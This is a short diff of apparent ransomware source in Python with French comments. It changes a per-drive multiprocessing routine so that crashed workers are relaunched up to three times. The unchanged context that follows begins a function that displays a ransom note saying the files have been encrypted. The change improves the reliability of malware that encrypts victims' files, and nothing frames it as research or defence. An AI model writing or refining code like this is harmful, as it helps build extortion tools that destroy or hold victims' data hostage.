@@ -283,25 +283,31 @@ def process_par_lecteur(chemin, nb_process):
 
     for _ in range(nb_process):
         queue.put(None)
+    max_relaunch = 3
+    relaunch_counts = [0] * nb_process
 
     while True:
         all_finished = True
         for i, p in enumerate(processus):
             if not p.is_alive():
-                # Worker mort, relancer
-                print(f"[!] Worker {i} mort, redémarrage...")
-                # Relancer worker
-                new_p = multiprocessing.Process(target=worker, args=(queue,))
-                new_p.start()
-                processus[i] = new_p
+                if p.exitcode != 0:  # crash / erreur
+                    if relaunch_counts[i] < max_relaunch:
+                        print(f"[!] Worker {i} mort anormalement, redémarrage ({relaunch_counts[i]+1}/{max_relaunch})...")
+                        new_p = multiprocessing.Process(target=worker, args=(queue,))
+                        new_p.start()
+                        processus[i] = new_p
+                        relaunch_counts[i] += 1
+                        all_finished = False
+                    else:
+                        print(f"[!] Worker {i} a atteint la limite de relance.")
+                else:
+                    # worker terminé proprement, on ne relance pas
+                    print(f"[+] Worker {i} a terminé normalement.")
             else:
                 all_finished = False
         if all_finished:
             break
-        time.sleep(10)  # pause avant p
-
-    for p in processus:
-        p.join()
+        time.sleep(10)
         
 def afficher_ransom_note(lecteurs):
     note = """Vos fichiers ont été chiffrés.
